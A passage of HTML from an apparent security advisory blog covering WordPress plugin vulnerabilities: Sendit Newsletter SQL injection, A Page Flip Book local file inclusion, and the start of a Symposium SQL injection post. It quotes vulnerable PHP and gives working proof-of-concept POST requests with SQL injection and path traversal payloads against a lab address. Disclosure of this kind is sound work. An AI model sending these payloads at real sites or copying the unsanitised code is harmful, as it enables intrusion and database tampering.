class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">confirmed</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;/div&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-o">:</span><span class="crayon-h">&nbsp;&nbsp; </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">update</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-s">"update "</span><span class="crayon-sy">.</span><span class="crayon-v">SENDIT_EMAIL_TABLE</span><span class="crayon-sy">.</span><span class="crayon-s">" set $k = '$v' where id_email = $id"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-27">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">v</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">endif</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">endif</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0084 seconds] -->
<p>Because this call does not require any sort of authentication, we can make a simple POST request to exploit this and inject SQL:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2819a155590315" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/sendit/ajax.php? HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 71

id=1-52179 OR 1 = 1 ;-3&amp;thiskeygoesintothequery=settingthevaluetothis</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2819a155590315-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2819a155590315-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2819a155590315-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2819a155590315-4">4</div><div class="crayon-num" data-line="crayon-53c9878f2819a155590315-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2819a155590315-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2819a155590315-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">sendit</span><span class="crayon-o">/</span><span class="crayon-v">ajax</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2819a155590315-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f2819a155590315-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2819a155590315-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">71</span></div><div class="crayon-line" id="crayon-53c9878f2819a155590315-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2819a155590315-6"><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">-</span><span class="crayon-cn">52179</span><span class="crayon-h"> </span><span class="crayon-st">OR</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-o">-</span><span class="crayon-cn">3</span><span class="crayon-o">&amp;</span><span class="crayon-v">thiskeygoesintothequery</span><span class="crayon-o">=</span><span class="crayon-i">settingthevaluetothis</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0024 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/sendit-newsletter/" rel="tag">Sendit Newsletter</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/10/wordpress-sendit-newsletter-plugin-multiple-sql-injection/#respond" title="Comment on WordPress Sendit Newsletter plugin multiple SQL injection">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-43 -->

				
					
<article id="post-45" class="post-45 post type-post status-publish format-standard hentry category-advisories tag-a-page-flip-book tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/10/wordpress-a-page-flip-book-plugin-local-file-inclusion-vulnerability/" title="10:43 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-10T22:43:50+00:00" pubdate>July 10, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/10/wordpress-a-page-flip-book-plugin-local-file-inclusion-vulnerability/" title="Permalink to WordPress A Page Flip Book plugin local file inclusion vulnerability" rel="bookmark">WordPress A Page Flip Book plugin local file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49505/">Secunia Advisory SA 49505</a></p>
<p><strong>Analysis</strong><br />
A page flip book for WordPress allows for different languages to be used. This is toggled by posting &#8220;pageflipbook_language&#8221; to the blog, which will update an option and then include the appropiate language. This is done in the main file, <a href="http://plugins.svn.wordpress.org/wppageflip/trunk/pageflipbook.php">pageflipbook.php</a>, which is always included.</p>
<p>We can see that it checks if &#8220;pageflipbook_language&#8221; is included in a POST parameter on line 30, it will update the option on the blog, otherwise it will pull the language value from the option and put that into the variable. This value is supposed to be the name of a php file. After that, it will include the chosen language file on line 47.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2859f153080718" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ((isset($_POST['pageflipbook_language'])) AND ($_POST['pageflipbook_language']!='')) {
    $pageflipbook_language = $_POST['pageflipbook_language'];
    update_option('pageflipbook_language', $pageflipbook_language);
}
else
    $pageflipbook_language = get_option('pageflipbook_language');
if ($pageflipbook_language == '') $pageflipbook_language = 'EN_en.php';

define ('SITE_URL', get_option('siteurl') );
define ('PAGEFLIPBOOK_UPLOAD_DIR', ABSPATH . '/wp-content/plugins/wppageflip/');
define ('PAGEFLIPBOOK_UPLOAD_URL', SITE_URL . '/wp-content/plugins/wppageflip/');
define ('PAGEFLIPBOOK_ICONES_DIR', '../wp-content/plugins/wppageflip/images/');
define ('PAGEFLIPBOOK_PLUGIN_URL', SITE_URL . '/wp-content/plugins/wppageflip/');

require_once (ABSPATH.'wp-includes/pluggable.php');
include (PAGEFLIPBOOK_UPLOAD_DIR. 'functions.php');
include (PAGEFLIPBOOK_UPLOAD_DIR. 'quicktags.php');
include (PAGEFLIPBOOK_UPLOAD_DIR. 'languages/'. $pageflipbook_language);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2859f153080718-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2859f153080718-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2859f153080718-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2859f153080718-4">4</div><div class="crayon-num" data-line="crayon-53c9878f2859f153080718-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2859f153080718-6">6</div><div class="crayon-num" data-line="crayon-53c9878f2859f153080718-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2859f153080718-8">8</div><div class="crayon-num" data-line="crayon-53c9878f2859f153080718-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2859f153080718-10">10</div><div class="crayon-num" data-line="crayon-53c9878f2859f153080718-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2859f153080718-12">12</div><div class="crayon-num" data-line="crayon-53c9878f2859f153080718-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2859f153080718-14">14</div><div class="crayon-num" data-line="crayon-53c9878f2859f153080718-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2859f153080718-16">16</div><div class="crayon-num" data-line="crayon-53c9878f2859f153080718-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2859f153080718-18">18</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2859f153080718-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'pageflipbook_language'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">AND</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'pageflipbook_language'</span><span class="crayon-sy">]</span><span class="crayon-o">!=</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2859f153080718-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">pageflipbook_language</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'pageflipbook_language'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2859f153080718-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">update_option</span><span class="crayon-sy">(</span><span class="crayon-s">'pageflipbook_language'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">pageflipbook_language</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2859f153080718-4"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878f2859f153080718-5"><span class="crayon-st">else</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2859f153080718-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">pageflipbook_language</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'pageflipbook_language'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2859f153080718-7"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">pageflipbook_language</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pageflipbook_language</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'EN_en.php'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2859f153080718-8">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2859f153080718-9"><span class="crayon-e">define</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">'SITE_URL'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'siteurl'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2859f153080718-10"><span class="crayon-e">define</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">'PAGEFLIPBOOK_UPLOAD_DIR'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">ABSPATH</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'/wp-content/plugins/wppageflip/'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2859f153080718-11"><span class="crayon-e">define</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">'PAGEFLIPBOOK_UPLOAD_URL'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">SITE_URL</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'/wp-content/plugins/wppageflip/'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2859f153080718-12"><span class="crayon-e">define</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">'PAGEFLIPBOOK_ICONES_DIR'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'../wp-content/plugins/wppageflip/images/'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2859f153080718-13"><span class="crayon-e">define</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">'PAGEFLIPBOOK_PLUGIN_URL'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">SITE_URL</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'/wp-content/plugins/wppageflip/'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2859f153080718-14">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2859f153080718-15"><span class="crayon-e">require_once</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">ABSPATH</span><span class="crayon-sy">.</span><span class="crayon-s">'wp-includes/pluggable.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2859f153080718-16"><span class="crayon-e">include</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">PAGEFLIPBOOK_UPLOAD_DIR</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'functions.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2859f153080718-17"><span class="crayon-e">include</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">PAGEFLIPBOOK_UPLOAD_DIR</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'quicktags.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2859f153080718-18"><span class="crayon-e">include</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">PAGEFLIPBOOK_UPLOAD_DIR</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'languages/'</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">pageflipbook_language</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0062 seconds] -->
<p>But because there is no validation that the file is a valid language file and there is no directory transversal, we can do a local file inclusion attack on this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f285ac547492309" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/ HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

pageflipbook_language=../../../../../../../../dog.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f285ac547492309-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f285ac547492309-2">2</div><div class="crayon-num" data-line="crayon-53c9878f285ac547492309-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f285ac547492309-4">4</div><div class="crayon-num" data-line="crayon-53c9878f285ac547492309-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f285ac547492309-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f285ac547492309-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f285ac547492309-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f285ac547492309-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f285ac547492309-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">55</span></div><div class="crayon-line" id="crayon-53c9878f285ac547492309-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f285ac547492309-6"><span class="crayon-v">pageflipbook_language</span><span class="crayon-o">=</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-v">dog</span><span class="crayon-sy">.</span><span class="crayon-i">php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0024 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/a-page-flip-book/" rel="tag">A Page Flip Book</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/10/wordpress-a-page-flip-book-plugin-local-file-inclusion-vulnerability/#respond" title="Comment on WordPress A Page Flip Book plugin local file inclusion vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-45 -->

				
					
<article id="post-47" class="post-47 post type-post status-publish format-standard hentry category-advisories tag-symposium tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/10/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities-2/" title="9:02 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-10T21:02:31+00:00" pubdate>July 10, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/10/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities-2/" title="Permalink to WordPress Symposium plugin multiple SQL injection vulnerabilities" rel="bookmark">WordPress Symposium plugin multiple SQL injection vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49534/">Secunia Advisory SA 49534</a></p>
<p><strong>Analysis of group_menu_settings vulnerability</strong><br />
The group_menu_settings function in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.02/ajax/symposium_group_functions.php?rev=552870">/ajax/symposium_group_functions.php</a> allows an user to show settings for a group. The function takes a POST parameter called &#8220;uid1&#8243;, which is used for a sql query.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f28c40411970412" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Show Group Settings
if ($_POST['action'] == 'group_menu_settings') {

    global $wpdb, $current_user;

    $gid = $_POST['uid1'];

